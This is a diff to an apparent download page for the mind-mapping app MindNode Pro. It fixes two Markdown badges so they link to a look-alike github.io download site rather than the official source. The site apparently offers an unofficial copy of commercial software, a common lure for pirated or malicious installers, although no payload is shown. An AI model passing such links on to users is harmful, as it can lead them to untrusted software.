@@ -7,7 +7,7 @@ Whether you're a student, professional, or creative thinker, MindNode Pro provid
 ---
 
 ## ✅ Download MindNode Pro for macOS  
-[![Download MindNode Pro](https://mindnode-pro-download-mac.github.io/.github)
+[![Download MindNode Pro](https://img.shields.io/badge/Download-MindNode_Pro-blueviolet)](https://mindnode-pro-download-mac.github.io/.github)
 
 ---
 
@@ -68,7 +68,7 @@ MindNode Pro is a versatile mind mapping application that lets you create, edit,
 
 ---
 
-[![Download MindNode Pro](https://mindnode-pro-download-mac.github.io/.github)
+[![Download MindNode Pro](https://img.shields.io/badge/Download-MindNode_Pro-blueviolet)](https://mindnode-pro-download-mac.github.io/.github)
 
 ---
 
